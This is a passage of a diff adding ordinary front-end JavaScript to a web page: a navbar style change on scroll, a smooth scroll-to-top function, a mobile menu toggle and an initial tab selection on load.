+        window.addEventListener('scroll', () => {
+            const navbar = document.getElementById('navbar');
+            if (window.scrollY > 50) {
+                navbar.classList.add('scrolled');
+            } else {
+                navbar.classList.remove('scrolled');
+            }
+        });
+
+        // Smooth scroll to top
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Mobile menu toggle
+        function toggleMenu() {
+            const navLinks = document.querySelector('.nav-links');
+            navLinks.style.display = navLinks.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        // Initialize on load
+        window.addEventListener('load', () => {
+            switchTab(0, document.querySelector('.tab'));
         });
     </script>
 </body>
